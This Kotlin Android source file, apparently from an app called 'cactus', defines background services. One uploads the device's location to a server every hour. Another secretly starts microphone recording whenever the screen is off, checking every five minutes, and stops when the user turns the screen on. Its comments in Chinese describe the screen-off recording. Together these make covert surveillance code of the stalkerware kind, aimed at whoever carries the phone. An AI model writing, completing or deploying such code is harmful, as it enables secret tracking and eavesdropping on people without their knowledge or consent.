package com.zhu.cactus.services

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkRequest
import android.os.Build
import android.os.Environment
import android.os.PowerManager
import android.util.Log
import androidx.annotation.RequiresApi
import com.zhu.cactus.App
import com.zhu.cactus.location.uploadAddress
import com.zhu.cactus.method.NetworkCallbackImpl
import com.zhu.cactus.utils.getCurrentTime
import com.zhu.cactus.utils.isApkInDebug

class network : component_impl {

    override fun start() {
        val networkCallback =
            NetworkCallbackImpl()
        val builder = NetworkRequest.Builder()
        val request = builder.build()
        val connMgr =
            App.context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        connMgr.registerNetworkCallback(request, networkCallback)
    }

}

class Location : component_impl {
    companion object {
        var sleepTime = 3600000L//一小时
        var lastLongitude = 0.0
        var lastLatitude = 0.0
        var lastSpeed = 0.0
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun start() {
        val t = Thread {
            while (true) {
                uploadAddress(App.context)//先执行再睡眠
                if (isApkInDebug(App.context))
                    Thread.sleep(5000)//test
                else
                    Thread.sleep(sleepTime)
            }
        }
        t.isDaemon = true

        t.priority = 1
        t.start()
    }

}

class record_audio : component_impl{
    override fun start() {

        val powerManager =  App.context.getSystemService(Context.POWER_SERVICE) as PowerManager

//true为打开，false为关闭
        Runnable {
            run {
                Log.d("audio","录音开始,位置状态？"+ Environment.getExternalStorageState().toString())
                val audioRecord = OnlyAudioRecorder.instance

                while (true) {

                    if( getCurrentTime() || powerManager.isInteractive ) { // 晚上，不录
                        Log.d("录音","开屏停止，sleep 15s ")
                        audioRecord.stopRecord()//停止录音
                        Thread.sleep(15000)
                    }
                    else{
                        Log.d("录音","息屏录音")
                        audioRecord.startRecord()//开始录音
                        Thread.sleep(60000*5)// 五分钟检查一次
                    }

                }


            }
        }.run()
    }

}